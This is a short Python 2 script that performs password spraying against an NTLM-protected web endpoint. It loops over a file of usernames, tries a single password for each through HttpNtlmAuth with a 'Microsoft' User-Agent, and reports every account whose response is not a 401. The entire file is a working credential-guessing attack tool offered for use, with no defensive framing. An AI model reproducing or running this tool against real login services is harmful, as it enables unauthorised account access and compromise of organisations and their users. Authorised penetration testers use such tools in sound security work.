import sys
import base64
import requests
from requests_ntlm import HttpNtlmAuth

def send_request(username, password, url, domain):
	print "Trying user %s\\%s" % (domain, username)
	try:
		req = requests.get(url, auth = HttpNtlmAuth("%s\\%s" % (domain, username), password), headers = {'User-Agent': 'Microsoft'})
		if not req.status_code == 401:
			print "User %s password is %s" % (username, password)
	except:
		print sys.exc_info()[0]
	
if __name__ == "__main__":

	if len(sys.argv) < 5:
		print "Usage: %s list domain url password" % sys.argv[0]
		sys.exit(0)

	domain = sys.argv[2]
	url = sys.argv[3]
	password = sys.argv[4]
	print "Spraying password %s against %s using domain %s" % (password, url, domain)
	for email in open(sys.argv[1], "rb").readlines():
		send_request(email.strip(), password, url, domain)
